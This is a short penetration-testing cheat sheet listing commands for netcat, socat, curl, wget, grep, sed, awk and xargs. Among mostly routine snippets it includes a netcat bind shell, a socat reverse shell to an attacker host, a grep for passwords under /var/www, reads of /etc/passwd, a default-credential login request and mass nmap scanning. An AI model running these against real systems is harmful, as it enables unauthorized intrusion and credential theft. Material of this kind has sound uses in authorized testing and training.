# Practical Kali Tools

## netcat / ncat
```bash
# Port scanning
nc -zv $TARGET_IP 1-1000 2>&1 | grep open

# Banner grabbing
nc -v $TARGET_IP 22

# File transfer
nc -lvnp 4444 < file.txt
nc $TARGET_IP 4444 > file.txt

# Bind shell
nc -lvnp 4444 -e /bin/bash
```

## socat
```bash
# Reverse shell
socat TCP4:$ATTACK_IP:4444 EXEC:/bin/bash

# Port forward
socat TCP4-LISTEN:8080,fork TCP4:$TARGET_IP:80

# SSL listener
socat OPENSSL-LISTEN:4443,cert=server.pem,verify=0,fork STDOUT
```

## curl
```bash
curl -s http://$TARGET_IP
curl -s -I http://$TARGET_IP
curl -s -X POST http://$TARGET_IP/login -d "user=admin&pass=admin"
curl -s -H "Cookie: session=abc123" http://$TARGET_IP
curl -s -u admin:password http://$TARGET_IP/admin
curl -s -L http://$TARGET_IP
curl -s -X POST http://$TARGET_IP/api/data -H "Content-Type: application/json" -d '{"key":"value"}'
```

## wget
```bash
wget http://$TARGET_IP/file
wget -r http://$TARGET_IP/directory/
```

## grep / sed / awk
```bash
# grep
grep -r "password" /var/www/
grep -v "^#" /etc/config
grep -i "admin" /etc/passwd

# sed
sed 's/old/new/g' file.txt
sed -n '5,10p' file.txt
sed '/^$/d' file.txt

# awk
awk '{print $1}' file.txt
awk -F":" '{print $1,$3}' /etc/passwd
awk '$3 > 500 {print $1}' /etc/passwd
```

## sort / uniq / xargs
```bash
sort file.txt | uniq -c | sort -n
cat targets.txt | xargs -P 10 -I % nmap -sV -p 80 %
```
